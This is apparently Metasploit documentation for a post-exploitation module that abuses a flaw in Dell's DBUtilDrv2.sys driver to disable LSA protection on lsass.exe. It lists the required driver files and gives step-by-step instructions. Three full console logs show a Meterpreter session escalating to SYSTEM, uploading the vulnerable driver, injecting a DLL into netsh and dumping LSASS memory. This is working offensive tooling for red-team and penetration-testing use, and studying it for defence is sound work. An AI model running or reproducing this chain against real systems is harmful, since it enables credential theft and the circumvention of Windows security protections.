## Vulnerable Application

The Dell driver dbutil_2_3.sys was affected by a local privilege escalation issue due
to a write-what-where condition exposed by a few of the driver's IOCTLs. This was assigned
CVE-2021-21551. Dell "fixed" this issue by deprecating dbutil_2_3.sys and switching to
DBUtilDrv2.sys. The new driver prevent low privileged users from interacting with the driver
but **did not** fix the write-what-where condition.

This module leverages the write-what-where condition in DBUtilDrv2.sys version 2.5 or
2.7 to disable or enable [LSA protect](https://itm4n.github.io/lsass-runasppl/) on a given PID (assuming the system is
configured for LSA Protection). This would allow, for example, dumping LSASS memory even
when Secure Boot and RunAsPPL are enabled. Or, as another example, allow an attacker to
prevent antivirus from accessing the memory of a chosen process.

The Dell drivers **are not** distributed with Metasploit. The user must truly [BYOVD](https://attack.mitre.org/techniques/T1068/)
and upload the driver and installation files to the target system themselves. The module will
install, exploit, and remove the driver. Both installing the driver and dumping memory require high
privileged accounts. The following is the required files per version and their hashes:

### dbutildrv2.sys version 2.5

* DBUtilDrv2.cat - [23bbc48543a46676c5cb5e33a202d261a33704fe](https://www.virustotal.com/gui/file/4b93fc56db034bfebb227b1e2af1b5e71cc663ffeffe3b59618f634c22db579d)
* dbutildrv2.inf - [c40ebb395cb79c3cf7ca00f59f4dc17930435fc5](https://www.virustotal.com/gui/file/4e2aa67daab4c4acac3d6d13490f93d42516fa76b8fda87c880969fc793a3b42)
* DBUtilDrv2.sys - [90a76945fd2fa45fab2b7bcfdaf6563595f94891](https://www.virustotal.com/gui/file/2e6b339597a89e875f175023ed952aaac64e9d20d457bbc07acf1586e7fe2df8)

### dbutildrv2.sys version 2.7

* DBUtilDrv2.cat - [06f2b629e7303ac1254b52ec0560c34d72b46155](https://www.virustotal.com/gui/file/c77c24e945acc73d6b723f60bcdc0330ff501eea34b7da95061101dd1120392a)
* dbutildrv2.inf - [19f8da3fe9ddbc067e3715d15aed7a6530732ab5](https://www.virustotal.com/gui/file/56ed7ff7299c83b307282ce8d1def51d72a3663249e72a32c09f6264348b1da2)
* DBUtilDrv2.sys - [b03b1996a40bfea72e4584b82f6b845c503a9748](https://www.virustotal.com/gui/file/71fe5af0f1564dc187eea8d59c0fbc897712afa07d18316d2080330ba17cf009)
* WdfCoInstaller01009.dll - [c1e821b156dbc3feb8a2db4fdb9cf1f5a8d1be6b](https://www.virustotal.com/gui/file/3b9264416a78f5eab2812cd46b14f993815e9dbf5bd145b3876c2f0f93b98521)


See `scenarios` below for an example.

### Supported Targets

* Windows 10 x64 v1507 - v19044 (21H2)
* Windows 11 x64 21H2
* Windows Server 2016 x64 v1607 -  v1709
* Windows Server 2019 x64 v1909 - v2009 (20H2)

The targets must have UEFI or Secure Boot enabled and the [RunAsPPL](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
registry key should be configured.

## Options

### DRIVER_PATH

The path on the RHOST containing the driver inf, cat, and sys (and coinstaller depending on the version). For example,
in the scenarios below, the driver files are uploaded to `C:\Windows\Temp`, so this should be `set DRIVER_PATH C:\\Windows\\Temp`.

### ENABLE_MEM_PROTECT

Enable or disable memory protection on the targetted process. `false` will remove memory protection and `true` will enable it.

### PID

The ID of the targetted process. If set to 0 (the default value), the module will automatically find lsass.exe.

## Verification Steps

1. Start msfconsole
1. Get a system Meterpreter session on a host using UEFI or Secure Boot and configured with RunAsPPL.
1. Obtain the pid of lsass.exe: `ps | grep lsass`
1. Background the session
1. Do: `post/windows/gather/memory_dump`
1. Set the `SESSION`, `PID`, and `DUMP_PATH` options.
1. Do: `run`
1. Observe a permission denied error.
1. Return to the previous session: `sessions -i 1`
1. Upload the required driver files: `upload /home/albinolobster/drivers/2_7/ C:\\Windows\\Temp\\`
1. Background the session
1. Do: `use post/windows/manage/dell_memory_protect`
1. Set the `SESSION`, `PID`, and `DRIVER_PATH` (e.g. `C:\\Windows\\Temp`) options.
1. Do: `run`
1. Observe the module exits successfully.
1. Do: `post/windows/gather/memory_dump`
1. Do: `run`
1. Observe the successful memory dump of lsass

## Scenarios

### Windows 11 Build 22000.348 x64 using DBUtilDrv2 version 2.7

```
[*] Started reverse TCP handler on 10.0.0.9:1270 
[*] Meterpreter session 1 opened (10.0.0.9:1270 -> 10.0.0.8:47730 ) at 2021-12-07 12:48:57 -0800

meterpreter > sysinfo
Computer        : BADBLOOD
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: badblood\albinolobster
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps | grep lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User  Path
 ---  ----  ----       ----  -------  ----  ----
 740  572   lsass.exe  x64   0

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
msf6 post(windows/gather/memory_dump) > options

Module options (post/windows/gather/memory_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DUMP_PATH                   yes       File to write memory dump to
   DUMP_TYPE  standard         yes       Minidump size (Accepted: standard, full)
   PID                         yes       ID of the process to dump memory from
   SESSION                     yes       The session to run this module on

msf6 post(windows/gather/memory_dump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/memory_dump) > set PID 740
PID => 740
msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
DUMP_PATH => C:\Windows\Temp\lsass_dump
msf6 post(windows/gather/memory_dump) > run

[*] Running module against BADBLOOD
[*] Dumping memory for lsass.exe
[-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload /home/albinolobster/drivers/2_7/ C:\\Windows\\Temp
[*] uploading  : /home/albinolobster/drivers/2_7/WdfCoInstaller01009.dll -> C:\Windows\Temp\WdfCoInstaller01009.dll
[*] uploaded   : /home/albinolobster/drivers/2_7/WdfCoInstaller01009.dll -> C:\Windows\Temp\WdfCoInstaller01009.dll
[*] uploading  : /home/albinolobster/drivers/2_7/DBUtilDrv2.cat -> C:\Windows\Temp\DBUtilDrv2.cat
[*] uploaded   : /home/albinolobster/drivers/2_7/DBUtilDrv2.cat -> C:\Windows\Temp\DBUtilDrv2.cat
[*] uploading  : /home/albinolobster/drivers/2_7/dbutildrv2.inf -> C:\Windows\Temp\dbutildrv2.inf
[*] uploaded   : /home/albinolobster/drivers/2_7/dbutildrv2.inf -> C:\Windows\Temp\dbutildrv2.inf
[*] uploading  : /home/albinolobster/drivers/2_7/DBUtilDrv2.sys -> C:\Windows\Temp\DBUtilDrv2.sys
[*] uploaded   : /home/albinolobster/drivers/2_7/DBUtilDrv2.sys -> C:\Windows\Temp\DBUtilDrv2.sys
meterpreter > background
[*] Backgrounding session 1...
msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
msf6 post(windows/manage/dell_memory_protect) > options

Module options (post/windows/manage/dell_memory_protect):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   DRIVER_PATH                          yes       The path containing the driver inf, cat, and sys (and coinstaller)
   ENABLE_MEM_PROTECT  false            yes       Enable or disable memory protection
   PID                                  yes       The targetted process
   SESSION                              yes       The session to run this module on

msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp
DRIVER_PATH => C:\Windows\Temp
msf6 post(windows/manage/dell_memory_protect) > set PID 740
PID => 740
msf6 post(windows/manage/dell_memory_protect) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Launching netsh to host the DLL...
[+] Process 692 launched.
[*] Reflectively injecting the DLL into 692...
[+] Exploit finished
[*] Post module execution completed
msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
msf6 post(windows/gather/memory_dump) > options

Module options (post/windows/gather/memory_dump):

   Name       Current Setting             Required  Description
   ----       ---------------             --------  -----------
   DUMP_PATH  C:\Windows\Temp\lsass_dump  yes       File to write memory dump to
   DUMP_TYPE  standard                    yes       Minidump size (Accepted: standard, full)
   PID        740                         yes       ID of the process to dump memory from
   SESSION    1                           yes       The session to run this module on

msf6 post(windows/gather/memory_dump) > run

[*] Running module against BADBLOOD
[*] Dumping memory for lsass.exe
[*] Downloading minidump (4.11 MiB)
[+] Memory dump stored at /home/albinolobster/.msf4/loot/20211207125102_default_172.16.144.11_windows.process._368616.bin
[*] Deleting minidump from disk
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > 
```

### Windows 10 Build 19044.1348 x64 using DBUtilDrv2 version 2.5

```
[*] Started reverse TCP handler on 10.0.0.9:1270 
[*] Meterpreter session 1 opened (10.0.0.9:1270 -> 10.0.0.8:39523 ) at 2021-12-08 07:18:27 -0800

meterpreter > sysinfo
Computer        : DESKTOP-JCD6JN8
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: DESKTOP-JCD6JN8\albinolobster
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps | grep lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User  Path
 ---  ----  ----       ----  -------  ----  ----
 732  568   lsass.exe  x64   0

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
msf6 post(windows/gather/memory_dump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/memory_dump) > set PID 732
PID => 732
msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
DUMP_PATH => C:\Windows\Temp\lsass_dump
msf6 post(windows/gather/memory_dump) > run

[*] Running module against DESKTOP-JCD6JN8
[*] Dumping memory for lsass.exe
[-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
[*] uploading  : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
[*] uploaded   : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
meterpreter > background
[*] Backgrounding session 1...
msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect 
msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
DRIVER_PATH => C:\Windows\Temp\
msf6 post(windows/manage/dell_memory_protect) > set PID 732
PID => 732
msf6 post(windows/manage/dell_memory_protect) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Launching netsh to host the DLL...
[+] Process 3508 launched.
[*] Reflectively injecting the DLL into 3508...
[+] Exploit finished
[*] Post module execution completed
msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump 
msf6 post(windows/gather/memory_dump) > run

[*] Running module against DESKTOP-JCD6JN8
[*] Dumping memory for lsass.exe
[*] Downloading minidump (5.93 MiB)
[+] Memory dump stored at /home/albinolobster/.msf4/loot/20211208072121_default_172.16.144.6_windows.process._495675.bin
[*] Deleting minidump from disk
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > 
```

### Windows Server 2016 (10.0.14393) x64 using DBUtilDrv2 version 2.5 and PID option set to 0

```
[*] Started reverse TCP handler on 10.0.0.3:4444 
[*] Meterpreter session 1 opened (10.0.0.3:4444 -> 10.0.0.8:45172 ) at 2021-12-18 04:12:03 -0800

meterpreter > sysinfo
Computer        : WIN-7ESIGFVFQEG
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN-7ESIGFVFQEG\albinolobster
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps | grep lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User  Path
 ---  ----  ----       ----  -------  ----  ----
 664  504   lsass.exe  x64   0

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/windows/gather/memory_dump
msf6 post(windows/gather/memory_dump) > set SESSIOn 1
SESSIOn => 1
msf6 post(windows/gather/memory_dump) > set PID 664
PID => 664
msf6 post(windows/gather/memory_dump) > set DUMP_PATH C:\\Windows\\Temp\\lsass_dump
DUMP_PATH => C:\Windows\Temp\lsass_dump
msf6 post(windows/gather/memory_dump) > run

[*] Running module against WIN-7ESIGFVFQEG
[*] Dumping memory for lsass.exe
[-] Post aborted due to failure: payload-failed: Unable to open process: Access is denied.
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload /home/albinolobster/drivers/2_5/ C:\\Windows\\Temp\\
[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.cat -> C:\Windows\Temp\\DBUtilDrv2.cat
[*] uploading  : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
[*] uploaded   : /home/albinolobster/drivers/2_5/dbutildrv2.inf -> C:\Windows\Temp\\dbutildrv2.inf
[*] uploading  : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
[*] uploaded   : /home/albinolobster/drivers/2_5/DBUtilDrv2.sys -> C:\Windows\Temp\\DBUtilDrv2.sys
meterpreter > background
[*] Backgrounding session 1...
msf6 post(windows/gather/memory_dump) > use post/windows/manage/dell_memory_protect
msf6 post(windows/manage/dell_memory_protect) > set DRIVER_PATH C:\\Windows\\Temp\\
DRIVER_PATH => C:\Windows\Temp\
msf6 post(windows/manage/dell_memory_protect) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/dell_memory_protect) > run

[*] Set PID option 664 for lsass.exe
[*] Launching netsh to host the DLL...
[+] Process 3008 launched.
[*] Reflectively injecting the DLL into 3008...
[+] Exploit finished
[*] Post module execution completed
msf6 post(windows/manage/dell_memory_protect) > use post/windows/gather/memory_dump
msf6 post(windows/gather/memory_dump) > run

[*] Running module against WIN-7ESIGFVFQEG
[*] Dumping memory for lsass.exe
[*] Downloading minidump (4.70 MiB)
[+] Memory dump stored at /home/albinolobster/.msf4/loot/20211218041511_default_172.16.144.14_windows.process._536152.bin
[*] Deleting minidump from disk
[*] Post module execution completed
msf6 post(windows/gather/memory_dump) > 
```
